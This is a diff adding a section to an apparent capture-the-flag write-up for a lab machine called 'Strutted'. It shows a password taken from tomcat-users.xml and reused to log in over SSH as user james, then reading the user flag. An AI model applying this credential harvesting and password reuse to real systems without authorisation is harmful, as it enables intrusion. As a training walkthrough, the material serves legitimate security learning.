@@ -323,3 +323,50 @@ Intrusion ready!! Let's go with the Privilege Escalation!!
 # Privilege Escalation: tomcat -> james
 
 <br />
+
+After a time enumerating the system we found `credentials` in the `tomcat-users.xml` file at tomcat path `/var/lib/tomcat9/conf`:
+
+<br />
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+...[snip...]
+<!--
+  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
+  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
+  <role rolename="manager-gui"/>
+  <role rolename="admin-gui"/>
+  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
+--->
+...[snip]...
+```
+
+<br />
+
+When we try to log with su into the user james, it doesn't work:
+
+<br />
+
+```bash
+tomcat@strutted:~/conf$ su james
+Password: 
+su: Authentication failure
+```
+
+<br />
+
+But it works for SSH:
+
+<br />
+
+```bash
+❯ ssh james@10.10.11.59
+james@10.10.11.59's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)
+...[snip]...
+james@strutted:~$ cd
+james@strutted:~$ cat user.txt
+1efebff443560ba883cf8e3c22xxxxxx
+```
+
+<br />
